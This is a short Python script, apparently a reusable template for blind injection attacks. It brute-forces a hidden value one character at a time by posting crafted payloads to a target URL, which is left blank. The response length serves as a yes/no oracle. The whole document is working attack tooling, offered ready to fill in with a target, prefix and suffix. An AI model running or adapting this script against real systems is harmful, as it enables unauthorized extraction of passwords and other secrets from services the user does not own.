
import requests

# Set the target url here
url = ""
verbose = False

elems = {
  # Prefix
  "p": "",
  # value searched
  "mid": "",
  # Suffix
  "s": "",
  "keep_going": True,
}
ord0 = ord('0')

def test_post(curr):
  # Payload is built from a prefix, the already found characters, the current test and a suffix
  payload = elems["p"]+elems["mid"]+curr+elems["s"]
  # Request here
  # res = requests.get(url, {"param1": "test1", "param2": payload, "aux": "test2"})
  res = requests.post(url, {"param1": "test1", "param2": payload, "aux": "test2"})
  if verbose: print(payload, len(res.text))
  # Modifiy validation condition as desired
  if len(res.text) == 399:
    if verbose: print("mid before", elems["mid"])
    elems["mid"] = elems["mid"]+curr
    if verbose: print("mid after", elems["mid"])
    # Validation condition has been met
    elems["keep_going"] = True

def do_from_a_to_b(a, b):
  for i in range(ord(a), ord(b)+1):
    if elems["keep_going"]: break
    test_post(chr(i))

def run_tests():
  # Modifiy character searched as desired
  for i in range(10):
    if elems["keep_going"]: break
    test_post(chr(ord0+i))
  for i in range(ord('a'), ord('z')+1):
    if elems["keep_going"]: break
    test_post(chr(i))
  # huge list
  # for i in range(ord('¤'), ord('~')+1):
  #   if elems["keep_going"]: break
  #   test_post(chr(i))
  # full list
  # for i in range(ord('¤'), ord('þ')+1):
  #   if elems["keep_going"]: break
  #   test_post(chr(i))

# Choose if you need a single or multiple loops
while elems["keep_going"]:
  # Validation condition is supposed to not have been met already
  elems["keep_going"] = False
  run_tests()

print("Found", elems["mid"])
